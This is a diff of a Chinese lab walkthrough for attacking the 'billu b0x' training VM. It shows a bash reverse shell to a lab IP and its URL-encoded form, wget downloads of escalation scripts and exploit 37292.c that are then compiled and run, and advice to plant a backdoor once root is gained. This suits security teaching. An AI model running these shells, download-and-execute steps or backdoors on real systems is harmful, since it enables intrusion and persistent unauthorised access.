@@ -1,7 +1,7 @@
 
-# Billu靶场web应用渗透案例
+# billu b0x 靶场web应用渗透案例
 
-20251202中关村互联网教育创新中心培训Billu靶场案例，服务器IP如下。
+20251202中关村互联网教育创新中心培训 billu b0x 靶场案例，服务器IP如下。
 
 | 机器 | IP |
 |:------|:------|
@@ -166,7 +166,7 @@ copy pic.jpg/b + muma.php/a shell.jpg
 nc -lvp 3333
 ```  
 
-用Hack-Tools生成反弹shell，将cmd传入反弹shell，即可getshell。注意，反弹shell使用URL编码。
+用Hack-Tools生成反弹shell，将cmd传入反弹shell，即可getshell。注意，反弹shell使用URL编码，所有的符号都进行URL编码。
 
 ```shell
 bash -c 'exec bash -i &>/dev/tcp/192.168.2.129/3333 <&1'
@@ -183,28 +183,30 @@ bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F192%2E168%2E2%2E129%2
 
 提权思路：SUID、sudo、环境变量、内核提权、计划任务。
 
-- 使用脚本扫描
+### 使用事先准备号的脚本扫描漏洞
 
-  - 提供脚本下载。
-    ```shell
-    python -m http.server 8888
-    ```
-  
-  - 下载提权脚本，赋权，执行。
-    ```shell
-    cd /tmp
-    wget http://192.168.2.222:8888/les.sh
-    chmod +x les.sh
-    ./les.sh
-    ```
+- 提供脚本下载。
+  ```shell
+  python -m http.server 8888
+  ```
+
+- 下载提权脚本，赋权，执行。
+  ```shell
+  cd /tmp
+  wget http://192.168.2.222:8888/les.sh
+  chmod +x les.sh
+  ./les.sh
+  ```
+
+### 用好exploit-db.com积攒EXP
 
 - 查看Linux操作系统版本
   ```shell
   cat /etc/*release
   ```
 
-- 用好exploit-db.com积攒EXP
-  用好提权漏洞漏洞 Privilege Escalation，找.c漏洞利用代码。
+- 根据操作系统版本，找对应的漏洞EXP
+  注意用好提权漏洞（Privilege Escalation），找.c漏洞利用代码。
   在kali里面也可以搜索利用。
   ```shell
   searchsploit Ubuntu 12.04
@@ -212,13 +214,27 @@ bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F192%2E168%2E2%2E129%2
   cp /dir/to/37292.c . # copy到自己的目录
   gcc 37292.c -o exp
   ```
-  再提供exp的下载，到目标机器上运行。
 
-- 运行exp后是root权限，再原有代码上修改，加上后门。
+  |![找到操作系统版本对应的提权漏洞EXP](./images/Billu11-PrivilegeEscalationEXP.png)|
+  |:--:|
+  | 找到操作系统版本对应的提权漏洞EXP |
 
-- 注意webshell不是交互式shell
-  无法在这里编译、执行exp。
-  但可以反弹
+- 再提供exp的下载，下载到目标机器上运行。
+  ```shell
+  cd /tmp
+  wget http://192.168.2.129:4444/37292.c
+  gcc 37292.c -o 37292
+  ./37292
+
+  ```
+
+## 后渗透工作
+
+- 运行exp后是root权限。再原有代码上修改，加上后门。方便后续利用。
+
+- 注意webshell不是交互式shell。
+  webshell无法在这里编译、执行exp。
+  但可以反弹。
   ```shell
   bash -i >& 192.168.2.138:8888 0>&1
   ```
